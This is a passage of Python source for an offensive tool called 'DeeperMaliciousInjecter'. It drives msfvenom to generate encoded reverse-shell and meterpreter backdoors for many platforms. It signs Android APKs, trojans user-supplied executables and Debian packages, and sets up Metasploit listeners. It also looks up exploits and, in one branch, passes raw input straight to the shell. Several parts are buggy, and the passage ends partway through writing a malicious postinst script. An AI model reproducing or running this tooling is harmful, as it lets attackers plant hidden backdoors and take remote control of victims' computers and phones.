            COMMAND = ('msfvenom -p {} LHOST={} LPORT={} -f raw -e {} -i {} | \
            msfvenom -a {} --platform {} -e {} -i {}  -f raw | \
            msfvenom -a {} --platform {} -e {} -i {} -f {} -o {}'.format(Payload,Host,Port,En_shikata,iterations,arc,Platform,En_countdown,iterations,arc,Platform,En_shikata,iterations,Format,Output))

            
        else:
             COMMAND = ('msfvenom -p {} LHOST={} LPORT={} -f raw -e {} -i {} | \
             msfvenom -a {} --platform {} -e {} -i {}  -f raw | \
             msfvenom -a {} --platform {} -e {} -i {} -f {} -b -o {}'.format(Payload,Host,Port,En_shikata,iterations,arc,Platform,En_countdown,iterations,arc,Platform,En_shikata,iterations,Format,badChars,Output))


        Save_Location()
        self.Create_Listener()



        


        #input()
    


        """
        msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.103 LPORT=4444  -k -e x86/shikata_ga_nai -i 10 -f raw | msfvenom -a x86 --platform linux -e x86/countdown -i 8 -f raw | msfvenom -a x86 --platform linux -e x86/bloxor -i 9 -f elf -o multiencoded.elf

        """


#::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
# Python Payload Function end 



    def Msfvenome_Payloads(self):
        cmd("clear")

        print(blue,"""
 _______ _______ _______ _______ _______ _______ _______ _______ 
|\     /|\     /|\     /|\     /|\     /|\     /|\     /|\     /|
| +---+ | +---+ | +---+ | +---+ | +---+ | +---+ | +---+ | +---+ |
| |   | | |   | | |   | | |   | | |   | | |   | | |   | | |   | |
| |P  | | |a  | | |y  | | |l  | | |o  | | |a  | | |d  | | |s  | |
| +---+ | +---+ | +---+ | +---+ | +---+ | +---+ | +---+ | +---+ |
|/_____\|/_____\|/_____\|/_____\|/_____\|/_____\|/_____\|/_____\|
""")
                                                                 

        global payload , rc 

        # print(blue)
        print()
        print()
        print(red+"     ╔─────────────────────────────────────────╗")
        print(red+ "     |"+white,' [01]' ,colored(' Windows => backdoor.exe','green'), "\t       "+red+"|")
        print(red+ "     |"+white,' [02]' ,colored(' Linux => backdoor.elf', 'green'), "\t       "+red+"|")
        print(red+"     |"+white,' [03]',colored(' Mac => backdoor.macho ', 'green'),"\t       "+red+"|")
        print(red+"     |"+white,' [04]',colored(' Android => backdoor.apk', 'green'), "\t       "+red+"|")
        print(red+"     |"+white, ' [05]',colored(' Bash => backdoor.sh', 'green'), "\t       "+red+"|")
        print(red+"     |"+white,' [06]',colored(' Perl => backdoor.pl', 'green'), "\t       "+red+"|")
        print(red+"     |"+white,' [07]',colored(" Python => Code Platform [Windows]", 'green')+red+"|")
        print(red+"     |"+white,' [08]',colored(" Java => backdoor.jar", 'green'), "\t       "+red+"|")
        print(red+"     |"+white,' [09]',colored(' PHP => backdoor.php', 'green'), "\t       "+red+"|")
        print(red+"     |"+white,' [10]',colored(' Asp => backdoor.asp ', 'green'), "\t       "+red+"|"+white)
        print(red+"     ╠─────────────────────────────────────────╝")

        print(white)
        Distro = platform.platform().split("-")[0]
        #Dist = green+distro+"@"+white
        SHELL = G+"└──["+R+"DeeperMaliciousInjecter"+G+"]──["+R+"~"+G+"]─["+B+'Payloads'+G+"]: "
        print("\n")
        #Dist = green+"[~] "+distro+"@"+white

        Counter=0
        chp = input(SHELL)

        ########################################################################
        def Save_Location():
            global savel 
            savel = Current_Dir + '/{}'.format(Pay_Name + Format)
            print(astg, 'File Save As : {}'.format(savel))
            self.PosTive_Loop()
            print()
            print(G+"└──["+R+"DeeperMaliciousInjecter"+G+"]──["+R+"~"+G+"]─["+B+'PRESS ENTER'+G+"]: ",end="");input()
            cmd("clear")

        ##########################################################################


        if chp=="":
            while Counter<1:
                Counter=1
                chp = input(SHELL)
                print()

            if Counter==1:
                print(warning,"Exception: INPUTError")
                sys.exit()



        ########## windows ############




        print()
        if chp == "1":
            cmd('clear')
            Payloads = ['windows/meterpreter/reverse_tcp', \
                        'windows/meterpreter/reverse_http', \
                        'windows/meterpreter/reverse_https', \
                        'windows/shell/reverse_tcp'
                        ]


            for i in Payloads:
                print(white+"[%d]" % (Payloads.index(i)+1), colored(i, 'cyan'))
            print()

            while True:
                try:
                    payload = int(input(SHELL))
                    print()
                    if payload == 1 or payload == 2 or payload == 3 or payload == 4:
                        break

                    else:
                        input(warning+" Choice Not Valid Option Press [Enter] ... ")
                except ValueError:
                    continue

            payload = Payloads[payload-1]
            global Format ,Pay_Name
            if payload:
                Format = ".exe"
            self.Get_Socket_Info()
            cmd("clear")
            self.PosTive_Loop()
            print()
            cmd("clear")
            self.Pay_INFO(payload, chost, cport, Pay_Name, Format)
           
            command = "msfvenom --payload {} --arch x86 --platform windows --encoder x86/shikata_ga_nai --format exe --iterations 5 LHOST={} LPORT={} -o {}{}  2>/dev/null".format(
            payload, LHOST, LPORT, Pay_Name, Format)


            ErrorLevel = cmd(command)


            if ErrorLevel !=0:
                print(warning,"Error Creating Payload ")
                sys.exit()
            
            else:
                Save_Location()



        ########### linux ################
        elif chp == "2":

            cmd('clear')

            Payloads = ['linux/x86/shell/reverse_tcp ', \
                        'linux/x86/meterpreter/reverse_tcp ', \
                        'linux/x64/meterpreter/reverse_tcp', \
                        'linux/x86/meterpreter/bind_tcp ', \
                        'linux/x86/shell/bind_tcp', \
                        'linux/x86/meterpreter_reverse_http', \
                        'linux/x86/meterpreter_reverse_https'

                        ]

            for i in Payloads:
                print(white+"[%d]" % (Payloads.index(i) +1), colored(i, 'cyan'))

            print('\n')
            while True:
                try:
                    payload = int(input(SHELL))
                    if payload == 1 or payload == 2 or payload == 3 or payload == 4 or payload == 5 or payload == 6 or payload == 7:
                        break
                    else:
                        continue

                except ValueError:
                    continue

            payload = Payloads[payload-1]
            if payload:
                Format = ".elf"

            self.Get_Socket_Info()
            cmd('clear')
            self.Pay_INFO(payload, chost, cport, Pay_Name, Format)
            #badChars ="\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
            command = 'msfvenom --payload {} --arch x86 --platform linux --format elf LHOST={} LPORT={} -o {}{} -b "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f" 2>/dev/null'.format(
                payload, LHOST, LPORT, Pay_Name, Format)
            ErrorLevel = cmd(command)
            if ErrorLevel == 0:
                Save_Location()


            else:
                print(warning, "Error Creating Payload ")
                sys.exit()


        ########## Mac ###########

        elif chp == "3":
            cmd("clear")
            Payloads = ['osx/x64/meterpreter/reverse_tcp', \
                        'osx/x64/meterpreter/bind_tcp', \
                        'osx/x64/shell_reverse_tcp', \
                        'osx/x86/shell_reverse_tcp '

                        ]

            for i in Payloads:
                print(white+'[%d]' % (Payloads.index(i) +1), colored(i, 'cyan'))

            print("\n")  # new line
            Counter = 0
            payload = input(SHELL)
            if payload == "1" or payload == "2" or payload == "3" or payload == "4":
                pass
            elif  payload=="":
                while Counter<1:
                    Counter=1
                    payload = input(SHELL)
                if Counter==1:
                    print(warning+" Exception: INPUT Error")
                    sys.exit()

            else:
                print(warning,"Exception: INPUT Error")
                sys.exit()


            payload = Payloads[payload-1]
            if payload:
                Format = ".macho"

            self.Get_Socket_Info()

            cmd("clear")
            self.PosTive_Loop()
            cmd('clear')
            self.Pay_INFO(payload, chost, cport, Pay_Name, Format)
            command = 'msfvenom --payload {}  -f macho LHOST={} LPORT={} -o {}{} 2>/dev/null'.format(payload, LHOST, LPORT,
                                                                                         Pay_Name, Format)
            ErrorLevel = (command)
            if ErrorLevel == 0:
                Save_Location()

            else:
                print(warning, "Error Creating Payload ")
                sys.exit()


        elif chp == "4":
            cmd("clear")

            Payloads = ['android/meterpreter/reverse_http', \
                        'android/meterpreter/reverse_https', \
                        'android/meterpreter/reverse_tcp', \
                        'android/meterpreter_reverse_http', \
                        'android/meterpreter_reverse_https', \
                        'android/meterpreter_reverse_tcp', \
                        'android/shell/reverse_http', \
                        'android/shell/reverse_https', \
                        'android/shell/reverse_tcp'
                        ]

            for i in Payloads:
                print(white+'[%d]' % (Payloads.index(i) +1), colored(i, 'cyan'))

            print()

            while True:
                try:
                    payload = int(input(SHELL))
                    if payload == 1 or payload == 2 or payload == 3 or payload == 4 or payload == 5 or payload == 6 or payload == 7 or payload == 8 or payload == 9:
                        break
                    else:
                        continue

                except ValueError:
                    continue
            cmd('clear')

            payload = Payloads[payload-1]
            if payload:
                Format = ".apk"
            self.Get_Socket_Info()

            cmd("clear")

            self.Pay_INFO(payload, chost, cport, Pay_Name, Format)

            command = 'msfvenom --payload {} --arch dalvik --platform android LHOST={} LPORT={} -e x86/shikata_ga_nai -i 5 -o {}{} 2>/dev/null'.format(
                payload, LHOST, LPORT, Pay_Name, Format)
            ErrorLevel = cmd(command)
            if ErrorLevel == 0:
                print(r, 'Done')
                print(astg,'Create Certificate')
                command = 'keytool -genkeypair  -alias androiddebugkey -keypass android -keystore debug.keystore -storepass android -dname "CN=Android Debug, O=Android,C=US" -validity 9999>/dev/null2>&1'
                cmd(command)
                sleep(1)
                print(astg,'Signing {}{}'.format(Pay_Name,Format))
                command = 'keytool -list -alias androiddebugkey -keystore debug.keystore -storepass android -keypass  android>/dev/null2>&1'
                cmd(command)
                command = 'jarsigner -verbose -keystore debug.keystore -storepass android -keypass android -digestalg SHA1  {} androiddebugkey>/dev/null2>&1'.format(
                    Pay_Name+Format)
                cmd(command)
                sleep(1)
                cmd('rm debug.keystore>/dev/null2>&1 ')
                Save_Location()

            else:
                print(warning, "Error Creating Payload ")
                sys.exit()


        elif chp == "5":
            cmd("clear")
            self.Get_Socket_Info()
            payload = "cmd/unix/reverse_bash"
            if payload:
                Format = ".sh"

            cmd("clear")


            self.Pay_INFO(payload, chost, cport, Pay_Name, Format)

            command = 'msfvenom -p cmd/unix/reverse_bash LHOST={} LPORT={} -f raw >  {}{} 2>/dev/null'.format(LHOST, LPORT,
                                                                                                  Pay_Name, Format)
            ErrorLevel == cmd(command)
            if ErrorLevel == 0:
                Save_Location()

            else:
                print(warning, "Error Creating Payload ")
                sys.exit()

        elif chp == "6":
            cmd("clear")
            payload = 'cmd/unix/reverse_perl'
            if payload:
                Format = ".pl"
            self.Get_Socket_Info()
            cmd("clear")


            self.Pay_INFO(payload, chost, cport, Pay_Name, Format)

            command = 'msfvenom -p {} LHOST={} LPORT={} -f raw > {}{} 2>/dev/null'.format(payload, LHOST, LPORT, Pay_Name, Format)
            ErrorLevel = cmd(command)
            if ErrorLevel == 0:
                Save_Location()

            else:
                print(warning, "Error Creating Payload ")
                sys.exit()

                       


        elif chp == "7":
            Form = 'raw'
            cmd("clear")
            payloads  = [
                        'python/meterpreter/bind_tcp_uuid', \
                        'python/meterpreter/reverse_http', \
                        'python/meterpreter/reverse_https', \
                        'python/meterpreter/reverse_tcp ', \
                        'python/meterpreter/reverse_tcp_ssl',\
                        'python/meterpreter/reverse_tcp_uuid',\
                        'python/meterpreter_reverse_http',\
                        'python/meterpreter_reverse_https',\
                        'python/meterpreter_reverse_tcp',\

                        ]




            for i in payloads:
                print(white+'[%d]' % (payloads.index(i) +1), colored(i, 'cyan')) 
               

    
                    
            print()

            while True:
                try:
                    payload = int(input(SHELL))
                    if payload == 1 or payload == 2 or payload == 3 or payload == 4 or payload == 5:
                        break
                    else:
                        
                        continue

                except ValueError:
                    continue
            cmd('clear')

            payload = payloads[payload-1]
            if payload:
                Format = ".py"
                

            #self.Python_Payload_Get_Socket_Info()
            #self.Python_Pay_INFO(payload, chost,cport)
            self.Python_Payload_Get_Socket_Info()

            cmd("clear")

            self.Python_Pay_INFO(payload, chost, cport,'raw')


            swirl = yaspin(
            spinner=Spinners.simpleDotsScrolling,
            text=astg+" Genrate Payload",
            color="green",
            side="right",
            sigmap={signal.SIGINT: fancy_handler},
            )

            

            with swirl as sp:
                command = 'msfvenom -p {} LHOST={} LPORT={}  -f raw '.format(payload, LHOST, LPORT)
                print()
                ErrorLevel = cmd(command)
                sp.green.ok("✔")

            if ErrorLevel == 0:
                print()
                print('Code')
                


            #cmd("clear")

            #self.Pay_INFO(payload, chost, cport, Pay_Name, Format)

            #command = 'msfvenom -p {} LHOST={} LPORT={} -f raw > {}{}   2>/dev/null'.format(payload, LHOST, LPORT, Pay_Name, Format)
            #ErrorLevel = cmd(command)
            #if ErrorLevel == 0:
                
                #Save_Location()

            #else:
               #print(warning, "Error Creating Payload ")
                #sys.exit()


        elif chp == "8":
            cmd("clear")

            Payloads = ["payload/java/meterpreter/reverse_http", 'payload/java/meterpreter/reverse_https ',
                        "payload/java/meterpreter/reverse_tcp"]

            for p in Payloads:
                print(white+"[%d]" % (Payloads.index(p+1)), colored(p, 'cyan'))

            print("\n")
            while True:
                try:
                    payload = int(input(SHELL))
                    if payload == 1 or payload == 2 or payload == 3:
                        break
                    else:
                        continue

                except ValueError:
                    continue
            cmd('clear')

            payload = Payloads[payload-1]
            if payload:
                Format = ".jar"

            self.Get_Socket_Info()

            cmd("clear")


            self.Pay_INFO(payload, chost, cport, Pay_Name, Format)

            command = 'msfvenom --arch java --platform java --payload {} --format raw LHOST={} LPORT={} --out {}{}>/dev/null 2>&1 '.format(
                payload, LHOST, LPORT, Pay_Name, Format)

            ErrorLevel = cmd(command)
            if ErrorLevel == 0:
                print()
                print(G+"└──["+R+"DeeperMaliciousInjecter"+G+"]──["+R+"~"+G+"]─["+B+'PRESS ENTER'+G+"]: ",end="");input()
                cmd("clear")

            else:
                print(warning, " Error Creating Payload ")
                sys.exit()


        elif chp == "9":
            cmd("clear")

            Payloads = ["payload/php/reverse_perl", "payload/php/reverse_php", "php/meterpreter_reverse_tcp"]

            for P in Payloads:
                print(white+"[%d]" % (Payloads.index(P) +1), colored(P, 'cyan'))
            print()

            while True:
                try:
                    payload = int(input(SHELL))
                    if payload == 1 or payload == 2 or payload == 3:
                        break
                    else:
                        continue

                except ValueError:
                    continue

            payload = Payloads[payload-1]

            if payload:
                Format = ".jar"

            self.Get_Socket_Info()
            cmd("clear")


            self.Pay_INFO(payload, chost, cport, Pay_Name, Format)

            command = 'msfvenom -p {} LHOST={} LPORT={} -f raw > {}{}>/dev/null 2>&1'.format(payload, LHOST, LPORT, Pay_Name, Format)
            ErrorLevel = cmd(command)
            if ErrorLevel == 0:
                command = "cat Backdoor.php | pbcopy && echo '<?php ' | tr -d '\n' > Backdoor.php && pbpaste >> Backdoor.php>/dev/null 2>&1"
                Save_Location()

            else:
                print(warning, "Error Creating Payload ")
                sys.exit()




        elif chp == "10":
            payload = 'windows/meterpreter/reverse_tcp'

            if payload:
                Format = ".asp"

            self.Get_Socket_Info()

            cmd("clear")


            self.Pay_INFO(payload, chost, cport, Pay_Name, Format)

            command = 'msfvenom --arc x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST={} LPORT={} -f asp > {}{}>/dev/null 2>&1'.format(LHOST,LPORT,Pay_Name, Format)
            ErrorLevel = cmd(command)
            if ErrorLevel == 0:
                Save_Location()

            else:
                print(warning, "Error Creating Payload ")
                sys.exit()


        else:
            cmd('clear')
            print('exec:')
            print()
            cmd('{}'.format(chp))
            print()
            print(G+"└──["+R+"DeeperMaliciousInjecter"+G+"]──["+R+"~"+G+"]─["+B+'PRESS ENTER'+G+"]: ",end="");input()
            self.Msfvenome_Payloads()
            #input(warning+"Wrong Input Press [Enter] .....  ")
            


#::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::

        lis = qu +white+' Create Listener [Y/N] : '
        while True:
            Listener = str(input(lis))
            if Listener.lower() == "":
                continue

            if Listener.lower() == "y" or Listener.lower() == "yes":
                print()
                print(astg,white+'Happy Hunting !!')
                cmd(
                    "xterm -fg green  -bg black -fa 'Monospace' -fs 11 -e msfconsole -q -x 'use exploit/multi/handler;set PAYLOAD {}; set LHOST {}; set LPORT {};set ExitOnSession false; run; exit -y' &".format(
                        payload, LHOST, LPORT))
                break

            elif Listener.lower() == "n" or Listener.lower() == "no":

                Date = str(gmtime()[0:3]).replace(', ', '_').strip('()')

                # TR
                ########################################
                def Hand():
                    a = 0
                    while a < 6:
                        print(green+".", end="")
                        a = 1
                        sys.stdout.flush()
                        sleep(0.017)

                ######################################
                cmd("clear")
                self.PosTive_Loop()
                print("\n")
                print(Ok,white+'Export -> rc File ', end="")
                print(sep="", end="".format(self.Wait()))
                rc = "Handler_{}.rc".format(Date)
                Rc_Path = Current_Dir + "/" + rc
                if os.path.isfile(Rc_Path) == True:
                    rand_num = random.randrange(100)
                    rc = "Handler{}_{}.rc".format(rand_num, Date)
                    
                    
                elif os.path.isfile(Rc_Path)==False:
                    rc = "Handler_{}.rc".format(Date)


                RC_FILE = open(rc, 'w')
                RC_FILE.write(
                    'use exploit/multi/handler\nset payload {}\nset LHOST {}\nset LPORT {}\nset ExitOnSession false\nexploit -j'.format(
                        payload, LHOST, LPORT))
                RC_FILE.close

                sleep(2)
                global SAVEL
                SAVEL = Current_Dir + "/Handler_{}.rc".format(Date)
                print("\n")
                print(astg,white+'File Save As :', Current_Dir+'/'+rc)
                print()
                print(astg,white+"Use msfconsole -r {}".format(rc))
                print()
                print(Ok,white+"Happy Hunting !!! ")
                print()
                print(G+"└──["+R+"DeeperMaliciousInjecter"+G+"]──["+R+"~"+G+"]─["+B+'PRESS ENTER'+G+"]: ",end="");input()
                break


#::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
    

    def Pay_INFO(self, payload, Host, Port, Payload_Name, Format):
        global Counter
        Counter = None
        print("\n")
        print(colored("Payload Information", 'cyan'))
        print()
        print(colored('-------------------------------------------', 'cyan'))
        print(colored('Payload | {} ', 'red').format(payload))
        print(colored('-------------------------------------------', 'cyan'))
        print(colored('LHOST   | {}', 'red').format(chost))
        print(colored('-------------------------------------------', 'cyan'))
        print(colored('LPORT   | {}', 'red').format(cport))
        print(colored('-------------------------------------------', 'cyan'))
        print(colored('Output  | {}{}', 'red').format(Pay_Name, Format))
        print(colored('-------------------------------------------', 'cyan'))
        print("\n")
        print(astg,'Creating Payload ', end=""), self.Wait()
        print()
        Counter = 1

#::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::


    def Searchsploit(self):
        # rmiregistry
        cmd('rm Sites.txt >/dev/null 2>&1')
        cmd('clear')
        sleep(1)
        ############ banner ##############
        print('''

 .dBBBBP   dBBBP dBBBBBb   dBBBBBb    dBBBP  dBP dBP   .dBBBBP dBBBBBb  dBP    dBBBBP dBP dBBBBBBP
  BP                   BB       dBP                     BP          dB'        dBP.BP              
  `BBBBb  dBBP     dBP BB   dBBBBK   dBP    dBBBBBP     `BBBBb  dBBBP' dBP    dBP.BP dBP    dBP    
     dBP dBP      dBP  BB  dBP  BB  dBP    dBP dBP         dBP dBP    dBP    dBP.BP dBP    dBP     
dBBBBP' dBBBBP   dBBBBBBB dBP  dB' dBBBBP dBP dBP     dBBBBP' dBP    dBBBBP dBBBBP dBP    dBP    
            ''')
        distro = platform.platform().split('-')[0]
        dist = colored(distro + '@', 'red')
        shell = G+"└──["+R+"DeeperMaliciousInjecter"+G+"]──["+R+"~"+G+"]─["+B+'Searchsploit'+G+"]: "
        print()
        while True:
            Search = str(input(shell))
           
            if Search == "":
                continue
            elif Search==' ':
                continue


            else:
                break

        COMMAND = os.popen('searchsploit {}'.format(Search)).read()

        if "Exploits: No Result" not in COMMAND:
            print(COMMAND)
            print()
            print(G+"└──["+R+"DeeperMaliciousInjecter"+G+"]──["+R+"~"+G+"]─["+B+'PRESS ENTER'+G+"]: ",end="");input()



        else:
            Search +=" exploit"
            sleep(2)
            cmd('clear')
            print(x,'Exploit Not Found')
            sleep(2)
            cmd("clear")
            print(astg,white+'Searching Online ', end=""), self.Wait()

            """
            DATA = {"q": Search}
            Encode = urllib.parse.urlencode(DATA)

            URL = 'https://www.google.com/search?'+  Encode 
            try:
                Re = requests.get(URL,headers={"User-Agent":"Mozilla/0.5"})
                #Re = requests.get(URL, headers={'User-Agent': "Mozilla/5.0"})
        
            except Exception:
                print(nok,'NO Internet Connection ', 'green')
                sys.exit()

            URLS = []
            soup = BeautifulSoup(Re.content,'html.parser')
            Get_Links = []
            
            #for l in soup.find_all('h3', {'class': 'LC20lb DKV0Md'}):
            for l in soup.find_all('h2',{'class':'r'}):
                l = l.a['href'].strip("/url?q=").split("&")[0]
                #class="LC20lb DKV0Md"
                print(l)
                input()
                #LINKS = l.a['href'].strip('/url?q=').split('&')[0]
                print(l)
                input()
                #print(LINKS)
                #input()
                UN_Links = unquote(unquote(LINKS))
                URLS.append(UN_Links)

            sleep(2)
            LINKS = str(URLS)
            print(LINKS)
            input()
            # Bs4 -> Google Search 
            """

            for url in search(Search):
                cmd("echo {} >> Sites.txt".format(url))
            


            Sites = open('Sites.txt','r')
            LINKS = Sites.read()
           
            if "https://www.rapid7.com" in LINKS or 'https://www.exploit-db.com' in LINKS or 'https://www.cvedetails.com' in LINKS or 'https://blog.hackingcodeschool.net' in LINKS or "https://null-byte.wonderhowto.com" in LINKS:
                cmd('clear')             

                Sites = open('Sites.txt','r')
                for i in Sites.readlines():
                    print(astg, i)               

                print(astg, colored('You Can Vist This Sites', 'blue'))
                print("\n")
                cmd('rm Sites.txt')
                print(G+"└──["+R+"DeeperMaliciousInjecter"+G+"]──["+R+"~"+G+"]─["+B+'PRESS ENTER'+G+"]: ",end="");input()



            else:
                print()
                print(nok,'No Rusult Found For {}'.format(Search))
                print("\n")
                print(G+"└──["+R+"DeeperMaliciousInjecter"+G+"]──["+R+"~"+G+"]─["+B+'PRESS ENTER'+G+"]: ",end="");input()



########################################################################################


    def PAYLOAD_INFO(self,payload,Host,Port,out_name,Tempte):

        print(colored("Payload Information", 'cyan'))
        print("\n")
        print(colored('-------------------------------------------', 'green'))
        print(colored('Payload | {} ', 'red').format(Pay))
        print(colored('-------------------------------------------', 'green'))
        print(colored('LHOST   | {}', 'red').format(chost))
        print(colored('-------------------------------------------', 'green'))
        print(colored('LPORT   | {}', 'red').format(cport))
        print(colored('-------------------------------------------', 'green'))
        print(colored('Template | {}', 'red').format(prog))
        print(colored('-------------------------------------------', 'green'))
        print(colored('Output  | {}', 'red').format(Pay_Name+'.exe'))
        print(colored('-------------------------------------------', 'green'))

        print("\n")
        print(astg,"Genrate Payload ", end=""), self.Wait()
        print("\n")
        return True


########################################################################################
#Backdoors



    def Windows_Backdoor(self):
        global  prog ,Pay
        cmd('clear')
        PAYLOADS = ["windows/meterpreter/reverse_tcp", "windows/meterpreter_reverse_https",
                    "windows/meterpreter_reverse_http", "windows/shell/reverse_tcp"]


        for p in PAYLOADS:
            print(white+'[%d]' % (PAYLOADS.index(p) +1),colored( p,'green'))

        print("\n")

        # Prompt
        print(G+"│")
        Ps1 = G+"└──["+R+"DeeperMaliciousInjecter"+G+"]──["+R+"~"+G+"]─["+B+'WindowsBackdoor -> '+G+"]: "
        Ps2 = G+"└──["+R+"DeeperMaliciousInjecter"+G+"]──["+R+"~"+G+"]─["+B+'WindowsBackdoor $:'+G+"]: "
        Ps3 = G+"└──["+R+"DeeperMaliciousInjecter"+G+"]──["+R+"~"+G+"]─["+B+'WindowsBackdoor >>'+G+"]: "

        Shells = [Ps1, Ps2, Ps3]
        RShells = random.choice(Shells)
        while True:
            try:
                Pay = int(input(RShells))
                if Pay=="":
                    continue
            except ValueError:
                continue
            break

        Pay = PAYLOADS[Pay-1]
        self.Get_Socket_Info()
        cmd("clear")
        self.PosTive_Loop()
        print()
        color = cyan+' Path To executable exe File >> '
        ex_prog = str(input(astg+color))
        prog = ex_prog.split('/')[-1]
        if os.path.isfile('{}'.format(ex_prog)) == True:
            cmd("clear")
            self.PAYLOAD_INFO(Pay,LHOST,LPORT,Pay_Name,prog)

            od = cmd ('msfvenom -p {} -x {} --keep EnableStageEncoding=true  --encoder x86/shikata_ga_nai --iterations 6  LHOST={} LPORT={} -o {}.exe>/dev/null 2>&1'.format(Pay,ex_prog,LHOST,LPORT,Pay_Name))


            if od > 0:
                print('\n')
                print(warning,white+'Error Creating Payload ')
                sys.exit()

            else:
                print()
                print(astg,white+"Done")
                print()
                while 1:
                    try:
                        Listener = str(input(qu+white+' Create Listener [y/n]? '))
                    except ValueError:
                        continue
                    if Listener.lower() == "y" or Listener.lower() == "yes":
                        cmd("xterm -fg green  -bg black -fa 'Monospace' -fs 11 -e msfconsole -q -x 'use exploit/multi/handler;set PAYLOAD {};LHOST={};LPORT={};run;exit-y'&")
                        break
                    elif Listener.lower() == "n" or Listener.lower() == "no":

                        def Hand_Loop():
                            for i in range(8):
                                print(colored(".",'green'),end="")
                                sys.stdout.flush()
                                sleep(0.017)

                        cmd('clear')
                        Date = str(gmtime()[0:3]).replace(', ', '_').strip('()')
                        self.PosTive_Loop()
                        print("\n")
                        print('Export -> rc File ', end="")
                        print(sep="", end="".format(Hand_Loop()))
                        rc = "Handler_{}.rc".format(Date)
                        Rc_Path = Current_Dir+"/"+rc
                        if os.path.isfile(Rc_Path)==True:
                            rand_num= random.randrange(100)
                            rc = "Handler{}_{}.rc".format(rand_num,Date)

                        RC_FILE = open(rc, 'w')
                        RC_FILE.write(
                            'use exploit/multi/handler\nset payload {}\nset LHOST {}\nset LPORT {}\nset ExitOnSession false\nexploit -j'.format(
                                Pay, LHOST, LPORT))
                        RC_FILE.close
                        sleep(2)
                        global SAVEL
                        SAVEL = Current_Dir +"/"+rc
                        print("\n")
                        print(white+'File Save As : ', SAVEL)
                        print(astg,white+"Use msfconsole -r {}".format(rc))
                        print()
                        print(G+"└──["+R+"DeeperMaliciousInjecter"+G+"]──["+R+"~"+G+"]─["+B+'PRESS ENTER'+G+"]: ",end="");input()
                        break



                    else:
                        print(nok,'Please Answer yes or no')
                        continue





        else:
            print(nok, '{} Not Found'.format(prog))
            print(G+"└──["+R+"DeeperMaliciousInjecter"+G+"]──["+R+"~"+G+"]─["+B+'PRESS ENTER'+G+"]: ",end="");input()

#########################################################################################



    def Linux_Deb_Injector(self):
        global Payload
        PATH = '/tmp/evil'
        # Remove Working Dir If Exists
        cmd('rm -rf {}>/dev/null 2>&1'.format(PATH))
        cmd("rm -rf /root/output>/dev/null 2>&1")
        cmd("clear")

# banner

        print(colored(''' ____       _    ___        _           _             
#########         #############################################
##'\v/`##         ##':v:`####\`~'/####[`'`']####(:)#####[`'`']#
##(o 0)##         ##(o:0)####(o o)#####|::|#####|:|######|  |##
###(_)###         ###(:)######\ / \####|::|#####|:|######|__|##
#########         #############"###############################                
                          ''','red'))

        print(blue+'''
 |^^^^^^^^^^^^^^|l___      
 |    PAYLOAD     |""\___, 
 |________________|__|)__| 
 |(@)(@)"""**|(@)(@)**|(@) 
 =========================
        '''+white)
###################################################################################
        #self.PosTive_Loop()
        print(blue+"::::::::::::::::::::::::::::::::::::::::::"+white)
        print(warning,blue+"Choice Payload"+white)
        print()

        Payloads = ['linux/x86/shell/reverse_tcp ', 'linux/x86/meterpreter/reverse_tcp ',
                    'linux/x86/meterpreter/bind_tcp',
                    'linux/x86/shell/bind_tcp', 'linux/x86/meterpreter_reverse_http',
                    'linux/x86/meterpreter_reverse_https']

        for p in Payloads:
            print(white+"[%d]" % (Payloads.index(p) +1), colored(p, 'cyan'))
        try:
            print()
            print(G+"│")
            shell = G+"└──["+R+"DeeperMaliciousInjecter"+G+"]──["+R+"~"+G+"]─["+B+'DebInjector'+G+"]: "
            Payload = int(input(shell))
            if Payload==1  or Payload==2 or Payload==3 or Payload==4 or Payload==5 or Payload==6:
                Payload = Payloads[Payload-1]
                self.Run_DEB_INJ()

            else:
                print(nok,"Exception: InpurError")
                sys.exit()

        except ValueError:
            print(nok,"Exception: ValueError")
            sys.exit()

        except KeyboardInterrupt:
            if os.path.isdir(PATH)==True:
                print()
                print(Ok, '[CTRL+C] PRESSED', end="")
                print()
                print(Ok, white + 'Cleanning Generated Files',end=""), self.Wait()
                print("[" + green + "OK" + white + "]", end="")
                cmd("rm -rf {}>/dev/null 2>&1".format(PATH))
                sleep(1)
                print()
                sys.exit()
            else:
                print()
                print(Ok, white + "Detecting [CTRL+C] Quiting.... ", end="")
                print()
                sys.exit()



#############################################################3

    def Run_DEB_INJ(self):
        cmd("clear")
        self.PosTive_Loop()
        print()

        print(qu + green+" Insert lhost")
        print()
        LHOST = input(colored(">> ", 'red'))
        if LHOST.count(".") == 3:
            LHOST = LHOST

        else:
            print(nok, "Exception: Not Valid IP Address")
            sys.exit()

        cmd("clear")
        self.PosTive_Loop()
        print()
        print(qu+green+" Insert lport")
        print()

        LPORT = int(input(colored(">> ", 'red')))
        if LPORT == "":
            print(nok, "Exception: InputError")
            sys.exit()

        cmd("clear")
        # Create Work Dir
        cmd("mkdir /root/output")
        cmd('mkdir /tmp/evil ')
        self.PosTive_Loop()
        print()
        print(warning,green+'Insert Deb Package  ')
        print()
        file_path = input(colored(">> ", 'red'))
        if file_path == "":
            print(nok,"Exception: INPUT Error")
            sys.exit()

        file_name = file_path.split('/')[-1]
        package_n = re.match(r'[a-z]+', file_name).group()
        # Pname = file_name.split('.')[0]
        if os.path.isfile(file_path) == True:
            cmd("clear")
            print(astg,white+'Extract', file_name)
            cmd('cp {} /tmp/evil/Original.deb'.format(file_path))
            os.chdir('/tmp/evil')
            cmd('dpkg -x Original.deb work ')
            Check_pac = cmd('apt-get --download-only install -y >/dev/null 2>&1 %s ' % package_n)
            if Check_pac == 0:
                PACN = package_n

            else:
                PACN = "dissy"
        else:
            print(nok ,"Exception: FileNotFound ")
            sys.exit()

        PATH = "/tmp/evil/work/usr/games/"
        if os.path.isdir(PATH) == True:
            PATH = "/tmp/evil/work/usr/games/"
            postinst = '''#!/bin/bash
